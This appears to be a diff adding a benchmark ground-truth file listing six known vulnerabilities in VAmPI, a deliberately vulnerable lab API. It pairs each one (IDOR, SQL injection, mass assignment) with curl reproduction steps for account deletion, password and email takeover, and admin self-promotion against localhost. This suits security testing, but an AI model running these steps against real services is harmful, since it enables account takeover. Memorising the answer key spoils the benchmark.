@@ -1,0 +1,120 @@
+[
+  {
+    "gt_id": "vampi-idor-get-001",
+    "vulnerability_class": "IDOR",
+    "cwe": "CWE-639",
+    "service_name": "vampi",
+    "artifact": {"type": "http_endpoint", "method": "GET", "path": "/users/v1/{username}", "app": "vampi"},
+    "ground_truth": {
+      "is_vulnerable": true,
+      "statement": "GET /users/v1/{username} returns any user's data without auth.",
+      "description": "Returns email and admin status for any username without authentication.",
+      "severity": "high", "confidence": "confirmed"
+    },
+    "code_evidence": {"locations": [{"file": "api_views/users.py", "function": "get_user", "line_start": 0, "line_end": 0, "cwe": "CWE-639", "description": "No auth check on user lookup"}]},
+    "runtime_evidence": {
+      "surface": {"endpoint": "/users/v1/{username}", "method": "GET"},
+      "probe": {"method": "GET", "url": "http://localhost:5050/users/v1/admin"},
+      "expected_vulnerable_response": {"status": 200, "body_contains": {"username": "admin"}}
+    },
+    "exploit_evidence": {"description": "Unauthenticated access to admin profile.", "reproduction_steps": ["curl http://localhost:5050/users/v1/admin"]}
+  },
+  {
+    "gt_id": "vampi-idor-delete-002",
+    "vulnerability_class": "IDOR",
+    "cwe": "CWE-639",
+    "service_name": "vampi",
+    "artifact": {"type": "http_endpoint", "method": "DELETE", "path": "/users/v1/{username}", "app": "vampi"},
+    "ground_truth": {
+      "is_vulnerable": true,
+      "statement": "DELETE /users/v1/{username} allows any authenticated user to delete another user.",
+      "description": "No ownership check on user deletion.",
+      "severity": "critical", "confidence": "confirmed"
+    },
+    "code_evidence": {"locations": [{"file": "api_views/users.py", "function": "delete_user", "line_start": 0, "line_end": 0, "cwe": "CWE-639", "description": "Deletes user without ownership check"}]},
+    "runtime_evidence": {
+      "surface": {"endpoint": "/users/v1/{username}", "method": "DELETE"},
+      "probe": {"method": "DELETE", "url": "http://localhost:5050/users/v1/name1", "headers": {"Authorization": "Bearer <attacker_token>"}},
+      "expected_vulnerable_response": {"status": 200}
+    },
+    "exploit_evidence": {"description": "Attacker deletes victim's account.", "reproduction_steps": ["curl -X DELETE -H 'Authorization: Bearer <token>' http://localhost:5050/users/v1/name1"]}
+  },
+  {
+    "gt_id": "vampi-idor-put-003",
+    "vulnerability_class": "IDOR",
+    "cwe": "CWE-639",
+    "service_name": "vampi",
+    "artifact": {"type": "http_endpoint", "method": "PUT", "path": "/users/v1/{username}/email", "app": "vampi"},
+    "ground_truth": {
+      "is_vulnerable": true,
+      "statement": "PUT /users/v1/{username}/email allows any user to change another user's email.",
+      "description": "Account takeover via email modification. No ownership check.",
+      "severity": "critical", "confidence": "confirmed"
+    },
+    "code_evidence": {"locations": [{"file": "api_views/users.py", "function": "update_email", "line_start": 0, "line_end": 0, "cwe": "CWE-639", "description": "Updates email without ownership check"}]},
+    "runtime_evidence": {
+      "surface": {"endpoint": "/users/v1/{username}/email", "method": "PUT"},
+      "probe": {"method": "PUT", "url": "http://localhost:5050/users/v1/name1/email", "headers": {"Authorization": "Bearer <attacker_token>", "Content-Type": "application/json"}, "body": {"email": "attacker@evil.com"}},
+      "expected_vulnerable_response": {"status": 204}
+    },
+    "exploit_evidence": {"description": "Attacker changes victim's email for account takeover.", "reproduction_steps": ["curl -X PUT -H 'Authorization: Bearer <token>' -H 'Content-Type: application/json' -d '{\"email\":\"evil@test.com\"}' http://localhost:5050/users/v1/name1/email"]}
+  },
+  {
+    "gt_id": "vampi-idor-put-004",
+    "vulnerability_class": "IDOR",
+    "cwe": "CWE-639",
+    "service_name": "vampi",
+    "artifact": {"type": "http_endpoint", "method": "PUT", "path": "/users/v1/{username}/password", "app": "vampi"},
+    "ground_truth": {
+      "is_vulnerable": true,
+      "statement": "PUT /users/v1/{username}/password allows any user to change another user's password.",
+      "description": "Direct account takeover. No ownership check.",
+      "severity": "critical", "confidence": "confirmed"
+    },
+    "code_evidence": {"locations": [{"file": "api_views/users.py", "function": "update_password", "line_start": 0, "line_end": 0, "cwe": "CWE-639", "description": "Changes password without ownership check"}]},
+    "runtime_evidence": {
+      "surface": {"endpoint": "/users/v1/{username}/password", "method": "PUT"},
+      "probe": {"method": "PUT", "url": "http://localhost:5050/users/v1/name1/password", "headers": {"Authorization": "Bearer <attacker_token>", "Content-Type": "application/json"}, "body": {"password": "hacked123"}},
+      "expected_vulnerable_response": {"status": 204}
+    },
+    "exploit_evidence": {"description": "Attacker resets victim's password.", "reproduction_steps": ["curl -X PUT -H 'Authorization: Bearer <token>' -H 'Content-Type: application/json' -d '{\"password\":\"hacked\"}' http://localhost:5050/users/v1/name1/password"]}
+  },
+  {
+    "gt_id": "vampi-sqli-005",
+    "vulnerability_class": "SQL_Injection",
+    "cwe": "CWE-89",
+    "service_name": "vampi",
+    "artifact": {"type": "http_endpoint", "method": "GET", "path": "/users/v1/_debug", "app": "vampi"},
+    "ground_truth": {
+      "is_vulnerable": true,
+      "statement": "Debug endpoint accepts raw SQL in query parameter.",
+      "description": "SQL injection via debug endpoint.",
+      "severity": "critical", "confidence": "confirmed"
+    },
+    "code_evidence": {"locations": [{"file": "api_views/users.py", "function": "debug", "line_start": 0, "line_end": 0, "cwe": "CWE-89", "description": "Passes user input directly to SQL query"}]},
+    "runtime_evidence": {
+      "surface": {"endpoint": "/users/v1/_debug", "method": "GET"}
+    },
+    "exploit_evidence": {"description": "SQL injection via debug endpoint.", "reproduction_steps": ["curl 'http://localhost:5050/users/v1/_debug?username=admin'"]}
+  },
+  {
+    "gt_id": "vampi-mass-assign-006",
+    "vulnerability_class": "Mass_Assignment",
+    "cwe": "CWE-915",
+    "service_name": "vampi",
+    "artifact": {"type": "http_endpoint", "method": "POST", "path": "/users/v1/register", "app": "vampi"},
+    "ground_truth": {
+      "is_vulnerable": true,
+      "statement": "Registration accepts admin field, allowing self-promotion.",
+      "description": "Mass assignment allows setting admin=true during registration.",
+      "severity": "critical", "confidence": "confirmed"
+    },
+    "code_evidence": {"locations": [{"file": "api_views/users.py", "function": "register", "line_start": 0, "line_end": 0, "cwe": "CWE-915", "description": "Accepts admin field in registration body without filtering"}]},
+    "runtime_evidence": {
+      "surface": {"endpoint": "/users/v1/register", "method": "POST"},
+      "probe": {"method": "POST", "url": "http://localhost:5050/users/v1/register", "body": {"username": "evil", "password": "evil", "email": "evil@test.com", "admin": true}},
+      "expected_vulnerable_response": {"status": 200}
+    },
+    "exploit_evidence": {"description": "Self-promote to admin during registration.", "reproduction_steps": ["curl -X POST -H 'Content-Type: application/json' -d '{\"username\":\"evil\",\"password\":\"evil\",\"email\":\"evil@test.com\",\"admin\":true}' http://localhost:5050/users/v1/register"]}
+  }
+]
